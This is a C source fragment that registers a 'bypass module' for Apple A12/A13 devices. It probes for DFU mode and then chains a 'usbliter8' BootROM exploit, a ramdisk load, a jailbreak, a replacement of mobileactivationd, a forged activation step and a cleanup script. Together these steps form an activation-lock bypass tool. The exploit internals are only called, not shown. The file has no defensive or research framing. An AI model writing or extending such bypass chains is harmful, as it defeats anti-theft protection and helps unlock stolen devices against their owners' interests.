// New bypass module registration
const bypass_module_t path_b_usbliter8_module = {
    .name        = "path_b_a12_usbliter8",
    .description = "A12/A13 bypass via usbliter8 BootROM exploit + jailbreak + activation",
    .probe       = path_b_usbliter8_probe,
    .execute     = path_b_usbliter8_execute
};
static int path_b_usbliter8_probe(device_info_t *dev)
{
    if (!dev || !dev->usb) {
        return 0;
    }

    /* Only for A12 (T8020) and A13 (T8030) */
    if (dev->cpid != 0x8020 && dev->cpid != 0x8030) {
        log_debug("[path_b_usbliter8] CPID 0x%04X not A12/A13, skipping", dev->cpid);
        return 0;
    }

    /* Must be in DFU mode */
    if (dev->is_dfu_mode != 1) {
        log_debug("[path_b_usbliter8] Device not in DFU mode, skipping");
        return 0;
    }

    log_info("[path_b_usbliter8] A12/A13 device in DFU mode detected -- usbliter8 compatible");
    return 1;
}
static int path_b_usbliter8_execute(device_info_t *dev) {
    // 1. Deliver usbliter8 exploit
    usbliter8_ctx_t ctx;
    if (usbliter8_init(&ctx, dev) != 0)
        return -1;
    if (usbliter8_deliver(&ctx) != 0)
        return -1;
    if (usbliter8_verify(dev) != 1)  // Should see PWND:[usbliter8] in serial
        return -1;
    
    // 2. Load ramdisk (reuse Path A's ramdisk infrastructure)
    if (path_a_load_ramdisk(dev) != 0)
        return -1;
    
    // 3. Jailbreak + mobileactivationd replacement (reuse Path A)
    if (path_a_jailbreak(dev) != 0)
        return -1;
    if (path_a_replace_mobileactivationd(dev) != 0)
        return -1;
    
    // 4. Activation record (reuse Path A's session activation)
    if (path_a_activate(dev) != 0)
        return -1;
    
    // 5. Cleanup
    if (deletescript_run(dev) != 0)
        return -1;
    
    // 6. Verify
    return activation_is_activated(dev) == 1 ? 0 : -1;
}
